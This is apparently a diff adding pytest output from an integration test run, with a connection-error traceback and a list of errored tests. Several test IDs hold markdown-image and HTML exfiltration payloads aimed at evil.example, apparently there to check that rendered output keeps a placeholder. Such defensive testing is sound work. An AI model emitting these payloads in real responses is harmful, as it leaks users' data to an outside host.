@@ -1,0 +1,30 @@
+                if not isinstance(exc, from_exc):
+                    continue
+                # We want to map to the most specific exception we can find.
+                # Eg if `exc` is an `httpcore2.ReadTimeout`, we want to map to
+                # `httpx2.ReadTimeout`, not just `httpx2.TimeoutException`.
+                if mapped_exc is None or issubclass(to_exc, mapped_exc):
+                    mapped_exc = to_exc
+    
+            if mapped_exc is None:  # pragma: no cover
+                raise
+    
+            message = str(exc)
+>           raise mapped_exc(message) from exc
+E           httpx2.ConnectError: [Errno -3] Temporary failure in name resolution
+
+/opt/venv/lib/python3.12/site-packages/httpx2/_transports/default.py:115: ConnectError
+=========================== short test summary info ============================
+ERROR tests/integration/test_06a_adapters.py::test_06a_model_adapter_streams_through_litellm_with_a_slot
+ERROR tests/integration/test_08t_r2_paths.py::test_08t_r2_direct_url_lines_keep_the_placeholder[![x](https://evil.example/p?q={v})]
+ERROR tests/integration/test_08t_r2_paths.py::test_08t_r2_direct_url_lines_keep_the_placeholder[![x]( //evil.example/p?q={v})]
+ERROR tests/integration/test_08t_r2_paths.py::test_08t_r2_direct_url_lines_keep_the_placeholder[![x][1]\n\n[1]: //evil.example/p?q={v}]
+ERROR tests/integration/test_08t_r2_paths.py::test_08t_r2_direct_url_lines_keep_the_placeholder[![x](<https://evil.example/a b?q= {v}>)]
+ERROR tests/integration/test_08t_r2_paths.py::test_08t_r2_direct_url_lines_keep_the_placeholder[<img src="https://evil.example/a b?q= {v}">]
+ERROR tests/integration/test_08t_r2_paths.py::test_08t_r2_direct_url_lines_keep_the_placeholder[<img src=//evil.example/?q={v}>]
+ERROR tests/integration/test_08t_r2_paths.py::test_08t_r2_direct_url_lines_keep_the_placeholder[<img src\n="http:evil.example/?q={v}">]
+ERROR tests/integration/test_08t_r2_paths.py::test_08t_r2_direct_url_lines_keep_the_placeholder[<img src\n=\n"http:evil.example/?q={v}">]
+ERROR tests/integration/test_08t_r2_paths.py::test_08t_r2_direct_url_lines_keep_the_placeholder[<span style="x:url(http:evil.example/?q={v})">]
+ERROR tests/integration/test_08t_r2_paths.py::test_08t_r2_direct_url_lines_keep_the_placeholder[<object data="http:evil.example/?q={v}">]
+ERROR tests/integration/test_08t_r2_paths.py::test_08t_r2_direct_stale_placeholder_is_passed_by_the_counter
+212 passed, 12 errors in 1143.03s (0:19:03)
